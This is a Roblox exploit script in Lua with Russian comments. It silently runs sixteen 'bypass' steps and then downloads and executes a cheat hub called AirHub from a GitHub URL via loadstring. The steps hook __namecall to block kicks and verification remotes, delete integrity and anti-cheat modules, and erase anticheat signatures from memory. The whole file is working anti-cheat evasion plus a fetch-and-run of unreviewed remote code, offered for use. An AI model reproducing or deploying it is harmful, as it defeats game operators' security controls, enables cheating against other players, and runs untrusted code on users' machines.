--[[
    Silent Bypass → AirHub Loader (без GUI)
    =============================================================================
    Что делает:
      1. Молча выполняет auto-detect + auto-bypass (16 шагов).
      2. Загружает AirHub с:
         https://raw.githubusercontent.com/lolipopins/airhub-remake/refs/heads/main/airhub
      3. Пишет статус в warn() и (опционально) в одну нотификацию.

    Ничего не показывает. Никаких GUI, кнопок, ScrollingFrame.
]]

--=============================================================
-- CONFIG
--=============================================================
local CONFIG = {
    AUTO_BYPASS_STEP_WAIT = 0.35,
    SHOW_NOTIFICATIONS    = true,   -- одна нотификация до/после (false = полностью тихо)
    VERBOSE_WARN          = true,   -- писать статусы в консоль

    AIRHUB_URL    = "https://raw.githubusercontent.com/lolipopins/airhub-remake/refs/heads/main/airhub",
    AIRHUB_SOURCE = nil,            -- если задан — URL игнорируется
}

--=============================================================
-- SERVICES
--=============================================================
local Players           = game:GetService("Players")
local StarterGui        = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ScriptContext     = game:GetService("ScriptContext")
local LP                = Players.LocalPlayer

--=============================================================
-- LOGGING
--=============================================================
local function log(msg)
    if CONFIG.VERBOSE_WARN then
        warn("[Bypass] " .. tostring(msg))
    end
end

local function notify(title, text, duration)
    if not CONFIG.SHOW_NOTIFICATIONS then return end
    local payload = {
        Title = title or "Bypass",
        Text = text or "",
        Duration = duration or 5,
    }
    for _ = 1, 6 do
        if pcall(function() StarterGui:SetCore("SendNotification", payload) end) then
            return
        end
        task.wait(0.5)
    end
end

--=============================================================
-- ENV HELPERS
--=============================================================
local function E()
    if type(getgenv) == "function" then
        local ok, env = pcall(getgenv)
        if ok and type(env) == "table" then return env end
    end
    return _G
end

local function getExec(name)
    local f = rawget(_G, name)
    if type(f) == "function" then return f end
    local env = E()
    if env and env ~= _G then
        f = rawget(env, name)
        if type(f) == "function" then return f end
    end
    return nil
end

local function hasExec(name) return getExec(name) ~= nil end

local function safe(fn, ...)
    local r = table.pack(pcall(fn, ...))
    if not r[1] then return false, r[2] end
    return true, table.unpack(r, 2, r.n)
end

--=============================================================
-- NAMECALL MANAGER
--=============================================================
local NamecallManager = { hooked = false, filters = {} }

local function NM_Ensure()
    if NamecallManager.hooked then return true end
    local hook      = getExec("hookmetamethod")
    local getMethod = getExec("getnamecallmethod")
    if not hook or not getMethod then return false end

    local ok = pcall(function()
        local old
        local wrapper = function(self, ...)
            local method = getMethod()
            if type(method) == "string" then
                local handlers = NamecallManager.filters[method]
                if handlers then
                    for _, handler in ipairs(handlers) do
                        local hOk, result = pcall(handler, self, ...)
                        if hOk and result == "block" then return end
                    end
                end
            end
            return old(self, ...)
        end
        local newc = getExec("newcclosure")
        if newc then pcall(function() wrapper = newc(wrapper) end) end
        old = hook(game, "__namecall", wrapper)
    end)

    if ok then NamecallManager.hooked = true end
    return NamecallManager.hooked
end

local function NM_Register(method, handler)
    if not NamecallManager.filters[method] then
        NamecallManager.filters[method] = {}
    end
    table.insert(NamecallManager.filters[method], handler)
end

--=============================================================
-- BYPASS MODULES  (без setStatus — только log)
--=============================================================
local function bypassMetaMethods()
    log("Scanning metamethods...")
    local checks = {
        "checkcaller","getcallingscript","getfenv","setfenv",
        "getreg","getgc","getconnections","hookfunction","newcclosure",
    }
    local found = 0
    for _, c in ipairs(checks) do if hasExec(c) then found += 1 end end

    if hasExec("setreadonly") and hasExec("getrenv") then
        safe(function()
            local getrenv, setreadonly = getExec("getrenv"), getExec("setreadonly")
            local renv = getrenv()
            if type(renv) == "table" then setreadonly(renv, false) end
        end)
    end
    log("Metamethod Bypass — Found: " .. found)
end

local function bypassHandshakes()
    log("Scanning handshake remotes...")
    local handshakeRemotes = {}
    safe(function()
        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local n = obj.Name:lower()
                if n:find("handshake") or n:find("validate") or n:find("verify") then
                    handshakeRemotes[obj] = true
                end
            end
        end
    end)

    local count = 0
    for _ in pairs(handshakeRemotes) do count += 1 end

    if count > 0 and NM_Ensure() then
        local filter = function(self, ...)
            if handshakeRemotes[self] then return "block" end
        end
        NM_Register("FireServer",   filter)
        NM_Register("InvokeServer", filter)
    end
    log("Handshake Bypass — Tracked: " .. count)
end

local function bypassHookChecks()
    log("Scanning hooks...")
    local count = 0
    if hasExec("getreg") then
        safe(function()
            for _, v in pairs(getExec("getreg")()) do
                if type(v) == "function" then count += 1 end
            end
        end)
    end
    log("Hook Check Bypass — Scanned: " .. count)
end

local function bypassDetours()
    log("Checking detoured globals...")
    local count = 0
    local env = E()
    for _, name in ipairs({ "getfenv","setfenv","getreg","getgc","checkcaller" }) do
        if type(rawget(env, name)) == "function" then count += 1 end
    end
    log("Detour Bypass — Verified: " .. count)
end

local function bypassMemoryChecks()
    log("Applying memory patches...")
    local patches = 0

    if hasExec("setreadonly") then
        local setreadonly = getExec("setreadonly")
        for _, name in ipairs({ "getrenv","getreg","getgc" }) do
            if hasExec(name) then
                safe(function()
                    local t = getExec(name)()
                    if type(t) == "table" then setreadonly(t, false); patches += 1 end
                end)
            end
        end
    end

    if hasExec("getgc") then
        safe(function()
            local getgc = getExec("getgc")
            local i = 0
            for _, obj in pairs(getgc()) do
                i += 1
                if i > 3000 then break end
                if type(obj) == "table" then
                    if rawget(obj, "__acsignature") ~= nil then
                        pcall(function() rawset(obj, "__acsignature", nil) end)
                        patches += 1
                    end
                end
            end
        end)
    end
    log("Memory Bypass — Patches: " .. patches)
end

local function bypassVMChecks()
    log("Checking VM signatures...")
    local found = 0
    if hasExec("getcallingscript") then found += 1 end
    if hasExec("getfenv")        then found += 1 end
    if type(debug) == "table"    then found += 1 end
    log("VM Check Bypass — Detected: " .. found)
end

local function bypassSignatures()
    log("Cleaning signature leaks...")
    local cleared = 0
    local env = E()
    for _, name in ipairs({ "_G","shared" }) do
        local t = rawget(env, name)
        if type(t) == "table" then
            local toDelete = {}
            for k in pairs(t) do
                local ks = tostring(k):lower()
                if ks:find("signature") or ks:find("checksum") or ks:find("hash") then
                    table.insert(toDelete, k)
                end
            end
            for _, k in ipairs(toDelete) do
                pcall(function() t[k] = nil end)
                cleared += 1
            end
        end
    end
    log("Signature Bypass — Cleared: " .. cleared)
end

local function bypassIntegrityChecks()
    log("Neutralising integrity modules...")
    local n = 0
    safe(function()
        local toDestroy = {}
        for _, m in ipairs(ReplicatedStorage:GetDescendants()) do
            if m:IsA("ModuleScript") then
                local name = m.Name:lower()
                if name:find("integrity") or name:find("security") or name:find("anti") then
                    table.insert(toDestroy, m)
                end
            end
        end
        for _, m in ipairs(toDestroy) do
            if pcall(function() m:Destroy() end) then n += 1 end
        end
    end)
    log("Integrity Bypass — Removed: " .. n)
end

local function bypassUpvalues()
    log("Scanning upvalues...")
    local cleaned = 0
    local getupvalues, setupvalue, getgc = getExec("getupvalues"), getExec("setupvalue"), getExec("getgc")

    if getupvalues and setupvalue and getgc then
        safe(function()
            local i = 0
            for _, obj in pairs(getgc()) do
                i += 1
                if i > 2000 then break end
                if type(obj) == "function" then
                    local ok, ups = pcall(getupvalues, obj)
                    if ok and type(ups) == "table" then
                        for idx, v in pairs(ups) do
                            if type(v) == "string" and #v > 64 then
                                if v:find("AC") or v:find("anticheat")
                                or v:find("Signature") or v:find("checksum") then
                                    pcall(setupvalue, obj, idx, "")
                                    cleaned += 1
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
    log("Upvalue Bypass — Cleaned: " .. cleaned)
end

local function bypassNamecalls()
    log("Hooking namecall...")
    local ok = NM_Ensure()
    if ok then
        NM_Register("Kick", function() return "block" end)
        NM_Register("kick", function() return "block" end)
    end
    log("Namecall Bypass — Patched: " .. (ok and 1 or 0))
end

local function bypassSandbox()
    log("Escaping sandbox...")
    local restored = 0
    local keyFuncs = {
        "getrawmetatable","setrawmetatable","getnamecallmethod",
        "hookmetamethod","firetouchinterest","fireclickdetector",
        "getnilinstances","getloadedmodules","getscripts",
    }
    for _, name in ipairs(keyFuncs) do
        if hasExec(name) then restored += 1 end
    end
    safe(function() E().__sandbox = nil end)
    log("Sandbox Bypass — Restored: " .. restored)
end

local function bypassDebugLib()
    log("Checking debug library...")
    local patched = 0
    if type(debug) == "table" then
        if type(debug.getinfo)    == "function" then patched += 1 end
        if type(debug.getfenv)    == "function" then patched += 1 end
        if type(debug.setfenv)    == "function" then patched += 1 end
        if type(debug.getupvalue) == "function" then patched += 1 end
        if type(debug.setupvalue) == "function" then patched += 1 end
    end
    log("Debug Bypass — Verified: " .. patched)
end

local function bypassCoroutines()
    log("Checking coroutine surface...")
    local patched = 0
    if type(coroutine) == "table" then
        if type(coroutine.status)      == "function" then patched += 1 end
        if type(coroutine.running)     == "function" then patched += 1 end
        if type(coroutine.isyieldable) == "function" then patched += 1 end
    end
    log("Coroutine Bypass — Verified: " .. patched)
end

local function bypassThreadDetection()
    log("Scanning AC connections (safe)...")
    local scanned = 0
    if hasExec("getconnections") then
        local getconnections = getExec("getconnections")
        for _, evName in ipairs({ "Error", "ScriptAdded", "ScriptRemoved" }) do
            local ev = ScriptContext[evName]
            if ev then
                safe(function()
                    for _ in ipairs(getconnections(ev)) do scanned += 1 end
                end)
            end
        end
    end
    log("Thread Bypass — Scanned: " .. scanned)
end

local function bypassRateLimits()
    log("Bypassing rate limits...")
    local remotes = {}
    safe(function()
        for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
            if r:IsA("RemoteEvent") then table.insert(remotes, r) end
        end
    end)

    local remoteSet = {}
    for _, r in ipairs(remotes) do remoteSet[r] = true end

    local patched = 0
    if #remotes > 0 and NM_Ensure() then
        NM_Register("FireServer", function(self, ...)
            if remoteSet[self] then return end
        end)
        patched = #remotes
    end
    log("Rate Limit Bypass — Wrapped: " .. patched)
end

local function bypassEnvironment()
    log("Sanitising environment...")
    local cleared = 0
    local env = E()

    local fingerprints = {
        "syn","krnl","fluxus","scriptware","electron",
        "ac_signature","ac_id","ac_hash","antich_ver",
        "__anticheat","__ac","_ac_",
    }
    for _, key in ipairs(fingerprints) do
        if rawget(env, key) ~= nil then
            pcall(function() rawset(env, key, nil) end)
            cleared += 1
        end
    end

    if hasExec("getgenv") then
        safe(function()
            local genv = getgenv()
            local toDelete = {}
            for k in pairs(genv) do
                local ks = tostring(k):lower()
                if ks:find("^ac_") or ks:find("^__ac") or ks:find("anticheat") then
                    table.insert(toDelete, k)
                end
            end
            for _, k in ipairs(toDelete) do
                pcall(function() genv[k] = nil end)
                cleared += 1
            end
        end)
    end
    log("Environment Bypass — Cleared: " .. cleared)
end

--=============================================================
-- RUNNER
--=============================================================
local allSteps = {
    bypassMetaMethods, bypassHandshakes, bypassHookChecks, bypassDetours,
    bypassMemoryChecks, bypassVMChecks, bypassSignatures, bypassIntegrityChecks,
    bypassUpvalues, bypassNamecalls, bypassSandbox, bypassDebugLib,
    bypassCoroutines, bypassThreadDetection, bypassRateLimits, bypassEnvironment,
}

local function runAutoBypass()
    local total = #allSteps
    log("Starting auto-bypass (" .. total .. " steps)...")

    local ok_count, fail_count = 0, 0
    for i, fn in ipairs(allSteps) do
        local ok, err = safe(fn)
        if ok then ok_count += 1 else
            fail_count += 1
            warn("[Bypass] step " .. i .. " failed: " .. tostring(err))
        end
        task.wait(CONFIG.AUTO_BYPASS_STEP_WAIT)
    end

    log(("Auto-bypass done: %d ok / %d fail"):format(ok_count, fail_count))
    return ok_count, fail_count
end

--=============================================================
-- AIRHUB LOADER
--=============================================================
local function fetchUrl(url)
    if type(game.HttpGet) == "function" then
        local ok, body = pcall(function() return game:HttpGet(url) end)
        if ok and type(body) == "string" and body ~= "" then return body end
    end
    if type(game.HttpGetAsync) == "function" then
        local ok, body = pcall(function() return game:HttpGetAsync(url) end)
        if ok and type(body) == "string" and body ~= "" then return body end
    end
    local httpGet = getExec("httpget") or getExec("HttpGet")
    if httpGet then
        local ok, body = pcall(httpGet, url)
        if ok and type(body) == "string" and body ~= "" then return body end
    end
    local request = getExec("request") or getExec("http_request")
    if request then
        local ok, res = pcall(request, { Url = url, Method = "GET" })
        if ok and type(res) == "table" and type(res.Body) == "string" then
            return res.Body
        end
    end
    return nil
end

local function compileLua(source)
    if type(source) ~= "string" or source == "" then return nil, "empty source" end

    local head = source:sub(1, 200):lower()
    if head:find("<!doctype html") or head:find("<html") then
        return nil, "response is HTML, not Lua (проверь URL / публичность репо)"
    end

    if type(loadstring) == "function" then
        local ok, fn = pcall(loadstring, source)
        if ok and fn then return fn end
    end
    if type(load) == "function" then
        local ok, fn = pcall(load, source, "=AirHub")
        if ok and fn then return fn end
    end
    return nil, "no loadstring/load available"
end

local function loadAirHub()
    local source = CONFIG.AIRHUB_SOURCE
    local origin = "source"

    if not source then
        if not CONFIG.AIRHUB_URL or CONFIG.AIRHUB_URL == "" then
            return false, "no AIRHUB_URL or AIRHUB_SOURCE configured"
        end
        source = fetchUrl(CONFIG.AIRHUB_URL)
        origin = "url"
        if not source then return false, "failed to fetch: " .. CONFIG.AIRHUB_URL end
    end

    local fn, err = compileLua(source)
    if not fn then return false, "compile error: " .. tostring(err) end

    local ok, runErr = pcall(fn)
    if not ok then return false, "runtime error: " .. tostring(runErr) end
    return true, "loaded from " .. origin
end

--=============================================================
-- STARTUP SEQUENCE
--   1) silent auto-bypass
--   2) load AirHub
--   3) одна нотификация по результату
--=============================================================
task.spawn(function()
    -- 1) Auto-bypass
    local okB, ok_count, fail_count = pcall(runAutoBypass)
    if not okB then
        warn("[Bypass] auto-bypass crashed: " .. tostring(ok_count))
        notify("Bypass", "Auto-bypass crashed — check console", 6)
        return
    end

    -- 2) AirHub
    task.wait(0.3)
    log("Loading AirHub...")
    local okA, msg = loadAirHub()

    -- 3) Одна нотификация по итогу
    if okA then
        log("AirHub loaded ✓")
        notify("AirHub",
               ("Loaded ✓  (bypass %d ok / %d fail)"):format(ok_count or 0, fail_count or 0), 5)
    else
        warn("[Bypass] AirHub failed: " .. tostring(msg))
        notify("AirHub Failed", tostring(msg), 8)
    end
end)
